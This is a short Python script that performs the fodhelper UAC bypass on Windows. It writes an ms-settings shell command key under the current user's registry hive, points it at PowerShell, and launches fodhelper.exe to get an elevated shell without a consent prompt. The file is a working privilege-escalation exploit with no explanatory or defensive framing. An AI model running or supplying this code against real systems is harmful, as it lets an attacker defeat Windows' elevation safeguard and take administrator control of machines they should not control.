import winreg as reg
import os

reg_uac = reg.CreateKey(reg.HKEY_CURRENT_USER, r'Software\\Classes\\ms-settings\\shell\\open\\command')

reg_open_uac = reg.OpenKey(reg.HKEY_CURRENT_USER, r'Software\\Classes\\ms-settings\\shell\\open\\command', 0, reg.KEY_SET_VALUE)

reg.SetValueEx(reg_open_uac, "DelegateExecute", 0,  reg.REG_SZ, "")

reg.SetValueEx(reg_open_uac, "", 0, reg.REG_SZ, fr'powershell')

os.system("fodhelper.exe")

if __name__ == '__main__':
    pass
